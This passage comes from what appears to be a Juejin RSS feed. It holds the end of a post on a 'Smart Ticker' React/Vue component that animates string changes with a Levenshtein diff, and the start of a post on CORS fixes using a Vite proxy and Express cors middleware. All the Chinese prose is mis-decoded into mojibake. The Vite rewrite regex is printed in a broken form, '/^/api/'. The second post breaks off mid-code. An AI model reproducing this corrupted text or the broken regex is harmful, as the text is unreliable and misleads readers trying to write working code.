align="left">ä¸»è¦æ˜¯æ•°å­—</td></tr><tr><td align="left"><strong>åŠ¨ç”»æ•ˆæœ</strong></td><td align="left"><strong>ç²¾å‡†ç‚¹å¯¹ç‚¹ (åªåŠ¨å˜åŒ–çš„å­—ç¬¦)</strong></td><td align="left">æ»šè½®å¼ (å¿…é¡»æ»šè¿‡ä¸­é—´æ•°å­—)</td><td align="left">åªæœ‰æ•°å­—åœ¨å˜ï¼Œæ— ä½ç§»</td><td align="left">ç°ä»£ä¸”å¹³æ»‘</td></tr><tr><td align="left"><strong>ä¸­æ–‡/å…¨è§’é€‚é…</strong></td><td align="left"><strong>è‡ªåŠ¨å®½çª„å­—ç¬¦é€‚é…</strong></td><td align="left">å®¹æ˜“æŒ¤å‹æˆ–ä¹±ç </td><td align="left">N/A</td><td align="left">éœ€æ‰‹åŠ¨å¤„ç†</td></tr><tr><td align="left"><strong>å¤šæ¡†æ¶æ”¯æŒ</strong></td><td align="left"><strong>React + Vue 3 (åŒæ„æ ¸å¿ƒ)</strong></td><td align="left">JS Wrapper</td><td align="left">React</td><td align="left">å¤šæ¡†æ¶</td></tr><tr><td align="left"><strong>åŠ¨ç”»ä¸­æ–­</strong></td><td align="left"><strong>å¹³æ»‘æµä½“è¿‡æ¸¡</strong></td><td align="left">é‡ç½®æˆ–ç”Ÿç¡¬è·³è½¬</td><td align="left">å¹³æ»‘</td><td align="left">å¹³æ»‘</td></tr></tbody></table>
<p>æœ€å¤§çš„åŒºåˆ«åœ¨äºï¼šå¤§å¤šæ•°åº“æ˜¯æŠŠå†…å®¹å½“æˆâ€œæ•°å­—â€å¤„ç†ï¼Œè€Œ <strong>Smart Ticker</strong> æ˜¯æŠŠå†…å®¹å½“æˆ <strong>â€œå­—ç¬¦ä¸²â€</strong> å¤„ç†ã€‚è¿™æ„å‘³ç€ä½ å¯ä»¥ç”¨å®ƒæ¥æ»šåŠ¨çš„ä¸ä»…ä»…æ˜¯é‡‘é¢ï¼Œè¿˜å¯ä»¥æ˜¯ç”¨æˆ·åã€çŠ¶æ€æ–‡æœ¬ç­‰ç­‰ã€‚</p>
<h2 data-id="heading-2">æ ¸å¿ƒéš¾é¢˜ï¼šå¦‚ä½•è®©åŠ¨ç”»â€œèªæ˜â€èµ·æ¥ï¼Ÿ</h2>
<p>å¦‚æœä½ ç›´æ¥æŠŠ <code>1234</code> å˜æˆ <code>1254</code>ï¼Œæœ€ç¬¨çš„åŠæ³•æ˜¯æŠŠ <code>3</code> é”€æ¯ï¼Œåˆ›å»º <code>5</code>ã€‚ä½†æˆ‘ä»¬æƒ³è¦çš„æ˜¯ï¼šåªæœ‰ <code>3</code> å˜æˆ <code>5</code>ï¼Œå…¶ä»–æ•°å­—ä¿æŒé™æ­¢ã€‚</p>
<p>å¦‚æœå­—ç¬¦ä¸²é•¿åº¦ä¸ä¸€æ ·å‘¢ï¼Ÿæ¯”å¦‚ <code>Smart</code> å˜æˆ <code>Start</code>ã€‚</p>
<ul>
<li>ç¬¨åŠæ³•ï¼š5 ä¸ªå­—æ¯å…¨æ¢ã€‚</li>
<li><strong>èªæ˜åŠæ³•</strong>ï¼š<code>S</code>, <code>a</code>, <code>r</code>, <code>t</code> ä¸åŠ¨ï¼ŒæŠŠä¸­é—´çš„ <code>m</code> åˆ äº†ï¼Œæ’å…¥ä¸€ä¸ª <code>t</code>ï¼Ÿä¸å¯¹ï¼Œæ˜¯ <code>m</code> å˜æˆäº† <code>t</code>ã€‚</li>
</ul>
<p>è¿™æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ª <strong>Diff é—®é¢˜</strong>ã€‚æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä»â€œæ—§å­—ç¬¦ä¸²â€åˆ°â€œæ–°å­—ç¬¦ä¸²â€çš„<strong>æœ€çŸ­ç¼–è¾‘è·¯å¾„</strong>ã€‚</p>
<h2 data-id="heading-3">ç®—æ³•å¼•å…¥ï¼šLevenshtein Distance</h2>
<p>è¿™é‡Œæˆ‘å¼•å…¥äº† <strong>Levenshtein Distanceï¼ˆç¼–è¾‘è·ç¦»ï¼‰</strong> ç®—æ³•çš„å˜ç§ã€‚é€šå¸¸æˆ‘ä»¬ç”¨å®ƒæ¥è®¡ç®—ä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ä¼¼åº¦ï¼Œä½†åœ¨è¿™é‡Œï¼Œæˆ‘ç”¨å®ƒæ¥ç”Ÿæˆ<strong>æ“ä½œé˜Ÿåˆ—</strong>ã€‚</p>
<p>é€šè¿‡åŠ¨æ€è§„åˆ’çŸ©é˜µï¼Œæˆ‘ä»¬å¯ä»¥è®¡ç®—å‡ºæ¯ä¸€ä¸ªå­—ç¬¦åº”è¯¥æ‰§è¡Œä»€ä¹ˆåŠ¨ä½œï¼š</p>
<ol>
<li><strong>SAME (ä¸å˜)</strong>ï¼šä½ç½®ä¸å˜ï¼ŒUI ä¿æŒé™æ­¢ã€‚</li>
<li><strong>MODIFY (ä¿®æ”¹)</strong>ï¼šå­—ç¬¦å˜äº†ï¼ˆå¦‚ <code>3</code> -&gt; <code>5</code>ï¼‰ï¼Œæ‰§è¡Œæ»šåŠ¨åŠ¨ç”»ã€‚</li>
<li><strong>INSERT (æ’å…¥)</strong>ï¼šæ–°ä¸²å˜é•¿ï¼Œæ‰§è¡Œâ€œæŒ¤å…¥â€åŠ¨ç”»ã€‚</li>
<li><strong>DELETE (åˆ é™¤)</strong>ï¼šæ–°ä¸²å˜çŸ­ï¼Œæ‰§è¡Œâ€œæŒ¤å‡ºâ€åŠ¨ç”»ã€‚</li>
</ol>
<h3 data-id="heading-4">ä»£ç å®ç°</h3>
<p>åœ¨ <code>Core</code> æ¨¡å—ä¸­ï¼Œæˆ‘æ„å»ºäº†ä¸€ä¸ª <code>(N+1) x (M+1)</code> çš„çŸ©é˜µï¼Œå›æº¯è®¡ç®—æœ€ä¼˜è·¯å¾„ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç®€åŒ–çš„å›æº¯é€»è¾‘</span>
<span class="hljs-keyword">while</span> (i &gt; <span class="hljs-number">0</span> || j &gt; <span class="hljs-number">0</span>) {
    <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span> &amp;&amp; j &gt; <span class="hljs-number">0</span> &amp;&amp; oldStr[i-<span class="hljs-number">1</span>] === newStr[j-<span class="hljs-number">1</span>]) {
        <span class="hljs-comment">// å­—ç¬¦ç›¸ç­‰ -&gt; SAME</span>
        actions.<span class="hljs-title function_">unshift</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'SAME'</span>, <span class="hljs-attr">char</span>: oldStr[i-<span class="hljs-number">1</span>] });
        i--; j--;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (costMatrix[i][j] === costMatrix[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>) {
        <span class="hljs-comment">// æ›¿æ¢æ“ä½œ -&gt; MODIFY (Scroll)</span>
        actions.<span class="hljs-title function_">unshift</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'MODIFY'</span>, <span class="hljs-attr">from</span>: oldStr[i-<span class="hljs-number">1</span>], <span class="hljs-attr">to</span>: newStr[j-<span class="hljs-number">1</span>] });
        i--; j--;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-comment">/* ... */</span>) {
        <span class="hljs-comment">// å¤„ç† INSERT / DELETE</span>
    }
}
</code></pre>
<p>æ­£æ˜¯å› ä¸ºæœ‰äº†è¿™ä¸ªç®—æ³•ï¼Œ<code>Smart Ticker</code> æ‰èƒ½åšåˆ°ï¼š</p>
<ul>
<li><strong>100 -&gt; 105</strong>ï¼šåªæœ‰ <code>5</code> åœ¨åŠ¨ã€‚</li>
<li><strong>Downloading... -&gt; Done</strong>ï¼šæ™ºèƒ½è¯†åˆ«å“ªäº›å­—æ¯ä¿ç•™ï¼Œå“ªäº›å­—æ¯æ»šèµ°ã€‚</li>
</ul>
<h2 data-id="heading-5">æŒ‘æˆ˜äºŒï¼šä¸ä»…æ˜¯æ•°å­—ï¼Œä¸­è‹±å­—æ¯Emojiæˆ‘å…¨éƒ½è¦ï¼</h2>
<p>æå®šäº†ç®—æ³•ï¼Œæ¸²æŸ“å±‚åˆæ˜¯ä¸€ä¸ªå‘ã€‚
ä¸­æ–‡å­—ç¬¦ï¼ˆå…¨è§’ï¼‰å’Œè‹±æ–‡å­—ç¬¦ï¼ˆåŠè§’ï¼‰å®½åº¦ä¸ä¸€æ ·ã€‚å¦‚æœå¼ºè¡Œç”¨ç­‰å®½å­—ä½“ï¼Œä¸­æ–‡ä¼šè¢«æŒ¤æˆä¸€å›¢æˆ–è€…è‹±æ–‡é—´è·è¿‡å¤§ã€‚</p>
<p>æˆ‘ä¹Ÿé‡åˆ°è¿‡è¿™ç§â€œç¾éš¾ç°åœºâ€ï¼Œä¸­æ–‡æŒ¤åœ¨ä¸€èµ·æ ¹æœ¬æ²¡æ³•çœ‹ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong>
æˆ‘å®ç°äº†ä¸€ä¸ª <code>charWidth</code> åŠ¨æ€è®¡ç®—æœºåˆ¶ã€‚</p>
<ol>
<li><strong>æ£€æµ‹å­—ç¬¦ç±»å‹</strong>ï¼šé€šè¿‡ Unicode èŒƒå›´æ£€æµ‹å½“å‰å­—ç¬¦æ˜¯åŠè§’è¿˜æ˜¯å…¨è§’ï¼ˆæˆ–è€…æ˜¯ Emojiï¼‰ã€‚</li>
<li><strong>åŠ¨æ€åŸºå‡†å®½åº¦</strong>ï¼š
<ul>
<li>åŠè§’å­—ç¬¦ï¼ˆæ•°å­—/è‹±æ–‡ï¼‰ï¼šåŸºå‡†å®½ <code>0.8em</code>ï¼ˆç´§å‡‘ç¾è§‚ï¼‰ã€‚</li>
<li>å…¨è§’å­—ç¬¦ï¼ˆä¸­æ–‡ï¼‰ï¼šåŸºå‡†å®½ <code>1.25em</code>ï¼ˆé˜²æ­¢é‡å ï¼‰ã€‚</li>
<li>Emojiï¼šç‰¹æ®Šå¤„ç†ï¼Œç¡®ä¿ä¸è¢«æˆªæ–­ã€‚</li>
</ul>
</li>
</ol>
<p>è¿™æ ·ä¸€æ¥ï¼Œæ— è®ºè¾“ <code>BTC $98,000</code> è¿˜æ˜¯ <code>å“ˆåŸºç±³ ğŸ±</code>ï¼Œæ’ç‰ˆéƒ½ç¨³å¦‚è€ç‹—ã€‚</p>
<h2 data-id="heading-6">æŒ‘æˆ˜ä¸‰ï¼šåŒæ¡†æ¶æ”¯æŒ (React + Vue)</h2>
<p>æœ‰äº›åº“åªæœ‰ React ç‰ˆï¼Œæˆ‘çš„AIé…ç½®ç»„ä»¶é¡¹ç›®æ˜¯åŸºäº Vueã€‚ä¸ºäº†é›¨éœ²å‡æ²¾ï¼Œæˆ‘é‡‡ç”¨ <strong>"Core + Adapter"</strong> çš„æ¶æ„è®¾è®¡ã€‚</p>
<ul>
<li><strong>src/core/</strong>: çº¯ TypeScript å®ç° Diff ç®—æ³•ã€å­—ç¬¦åˆ—è¡¨ç”Ÿæˆã€ç¼“åŠ¨å‡½æ•°ã€‚ä¸ä¾èµ–ä»»ä½•æ¡†æ¶ã€‚</li>
<li><strong>src/components/Ticker.tsx</strong>: React å°è£…å±‚ï¼Œä½¿ç”¨ <code>useRef</code> å’Œ <code>RAF</code> ç®¡ç†åŠ¨ç”»ã€‚</li>
<li><strong>src/components/vue/Ticker.vue</strong>: Vue 3 å°è£…å±‚ï¼Œä½¿ç”¨ <code>watch</code> å’Œ <code>requestAnimationFrame</code>ã€‚</li>
</ul>
<p>ç»“æœï¼šä¸¤å¥—ç»„ä»¶ API å®Œå…¨ä¸€è‡´ï¼Œç»´æŠ¤èµ·æ¥ä¹Ÿæå…¶è½»æ¾ã€‚</p>
<h2 data-id="heading-7">æœ€ç»ˆæ•ˆæœ &amp; å¦‚ä½•ä½¿ç”¨</h2>
<p>ç°åœ¨ï¼Œä½ åªéœ€è¦ä¸€è¡Œä»£ç å°±èƒ½ç”¨ä¸Šè¿™ä¸ªâ€œèªæ˜â€çš„ç»„ä»¶ï¼š</p>
<p><strong>å®‰è£…ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash">npm install @tombcato/smart-ticker
</code></pre>
<p><strong>React ä½¿ç”¨ï¼š</strong></p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Ticker</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@tombcato/smart-ticker'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'@tombcato/smart-ticker/style.css'</span>;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Ticker</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"98,456.32"</span> /&gt;</span></span>
</code></pre>
<p><strong>Vue ä½¿ç”¨ï¼š</strong></p>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup&gt;
import { Ticker } from '@tombcato/smart-ticker/vue';
import '@tombcato/smart-ticker/style.css';
&lt;/script&gt;

&lt;template&gt;
  &lt;Ticker value="ğŸš€ å‘å°„æˆåŠŸ" /&gt;
&lt;/template&gt;
</code></pre>
<h2 data-id="heading-8">æ€»ç»“</h2>
<p>è¿™å°±æ˜¯ä¸€ä¸ªä»å°çµæ„Ÿåˆ°è½åœ°å®ç°çš„è¿‡ç¨‹ï¼ŒåšæŒèµ°ä¸‹å»ä»å®ç°å°çš„æƒ³æ³•åˆ°å®ç°å¤§çš„æƒ³æ³•ï¼Œå¦‚æœé˜¿ç¥–ä½ èƒ½çœ‹åˆ°è¿™é‡Œè¯·å¸®æˆ‘ç‚¹ä¸ªstarï¼Œæ„Ÿè°¢æ„Ÿè°¢ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è·¨åŸŸé—®é¢˜åŠè§£å†³æ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7589126814829674548</link>    <guid>https://juejin.cn/post/7589126814829674548</guid>    <pubDate>2025-12-29T14:36:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589126814829674548" data-draft-id="7589126217234317318" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è·¨åŸŸé—®é¢˜åŠè§£å†³æ–¹æ¡ˆ"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,é¢è¯•"/> <meta itemprop="datePublished" content="2025-12-29T14:36:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="DongHao"/> <meta itemprop="url" content="https://juejin.cn/user/1855631360790110"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è·¨åŸŸé—®é¢˜åŠè§£å†³æ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1855631360790110/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    DongHao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T14:36:10.000Z" title="Mon Dec 29 2025 14:36:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="an-old-hope">.hljs-comment,.hljs-quote{color:#b6b18b}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#eb3c54}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#e7ce56}.hljs-attribute{color:#ee7c2b}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#4fb4d7}.hljs-section,.hljs-title{color:#78bb65}.hljs-keyword,.hljs-selector-tag{color:#b45ea4}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1c1d21;color:#c0c5ce}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b2bce013b98a4afe93c566e86a301674~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRG9uZ0hhbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625377&amp;x-signature=vrjyuDdG1EAtZ%2Bad3sykWlRz3pg%3D" alt="PixPin_2025-12-29_22-12-49.png" loading="lazy"/></p>
<h2 data-id="heading-0">è·¨åŸŸåŸå› </h2>
<p>å½“å‰ç«¯è¯·æ±‚åœ°å€ä¸åç«¯æ¥å£åœ°å€ä¸åŒæºæ—¶ï¼Œæµè§ˆå™¨ä¼šæ‹¦æˆªæ¥å£è¯·æ±‚ï¼Œå‡ºç°è·¨åŸŸé—®é¢˜ã€‚</p>
<p><strong>åŒæº</strong>ï¼šåè®®ã€åŸŸåã€ç«¯å£å¿…é¡»å®Œå…¨ä¸€è‡´ã€‚</p>
<p><strong>è·¨åŸŸ</strong>ï¼šåè®®ã€åŸŸåã€ç«¯å£åªè¦æœ‰ä¸€ä¸ªä¸ä¸€è‡´ï¼Œå°±ä¼šè·¨åŸŸã€‚</p>
<p><strong>åŒæºç­–ç•¥</strong> æ˜¯æµè§ˆå™¨çš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œé™åˆ¶ä¸åŒæºçš„ç½‘ç«™ä¹‹é—´è¿›è¡Œæ— é™åˆ¶çš„èµ„æºè®¿é—®æˆ–è„šæœ¬äº¤äº’ï¼Œé˜²æ­¢æ¶æ„ç½‘ç«™é€šè¿‡è„šæœ¬çªƒå–å…¶ä»–ç½‘ç«™çš„æ•æ„Ÿæ•°æ®ï¼ˆå¦‚ Cookieã€æœ¬åœ°å­˜å‚¨ç­‰ï¼‰ã€‚</p>
<h2 data-id="heading-1">è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-2">å‰ç«¯é…ç½®ä»£ç†</h3>
<p>åœ¨é¡¹ç›®æ ¹ç›®å½•çš„ <code>vite.config.ts</code> ä¸­é…ç½® <code>server.proxy</code>ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">server</span>: {
    <span class="hljs-attr">proxy</span>: {
      <span class="hljs-string">'/api'</span>: {
        <span class="hljs-attr">target</span>: <span class="hljs-string">'http://localhost:3000'</span>, <span class="hljs-comment">// åç«¯æ¥å£åœ°å€</span>
        <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// å…è®¸è·¨åŸŸ</span>
        <span class="hljs-attr">rewrite</span>: <span class="hljs-function">(<span class="hljs-params">path</span>) =&gt;</span> path.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^/</span>api/, <span class="hljs-string">''</span>) <span class="hljs-comment">// å»æ‰ '/api' å‰ç¼€</span>
      }
    }
  }
});
</code></pre>
<h3 data-id="heading-3">åç«¯é…ç½® CORS</h3>
<p>CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰æ˜¯ W3C å®šä¹‰çš„è·¨åŸŸè§£å†³æ–¹æ¡ˆï¼Œé€šè¿‡åç«¯åœ¨å“åº”å¤´ä¸­æ·»åŠ  <code>Access-Control-Allow-Origin</code> ç­‰å­—æ®µï¼Œå‘Šè¯‰æµè§ˆå™¨ â€œå…è®¸å‰ç«¯çš„è·¨åŸŸè¯·æ±‚â€ã€‚</p>
<p>ä»¥ Node.js + Express ä¸ºä¾‹ï¼Œé…ç½®æ–¹å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);
<span class="hljs-keyword">const</span> cors = <span class="hljs-built_in">require</span>(<span class="hljs-string">'cors'</span>);
<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();

<span class="hljs-comment">// å…è®¸å‰ç«¯æœ¬åœ°è·¨åŸŸè¯·æ±‚</span>
app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cors</span>({
  <span class="hljs-attr">origin</span>: <span class="hljs-string">'http://localhost:5173'</span>, <span class="hljs-comment">// å‰ç«¯å¼€å‘æœåŠ¡å™¨åœ°å€</span>
  <span class="hljs-attr">methods</span>: [<span class="hljs-string">'GET'</span>, <span class="hljs-string">'POST'</span>], <span class="hljs-comment">// å…è®¸çš„è¯·æ±‚æ–¹æ³•</span>
  <span class="hljs-attr">allowedHeaders</span>: [<span class="hljs-string">'Content-Type'</span>, <span class="hljs-string">'Authorization'</span>] <span class="hljs-comment">// å…è®¸çš„è¯·æ±‚å¤´</span>
}));

<span class="hljs-comment">// æˆ–è€…æ›´ç®€å•ï¼šå…è®¸æ‰€æœ‰æºï¼ˆå»ºè®®å¼€å‘ç¯å¢ƒä¸´æ—¶ä½¿ç”¨ï¼Œç¦æ­¢ç”Ÿäº§ç¯å¢ƒä½¿ç”¨ï¼‰</span>
<span class="hljs-comment">// app.use(cors());</span>

<span class="hljs-comment">// åç«¯æ¥å£ç¤ºä¾‹</span>
app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/user'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  res.<span class="hljs-title function_">send</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'test'</span> });
});

app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> {
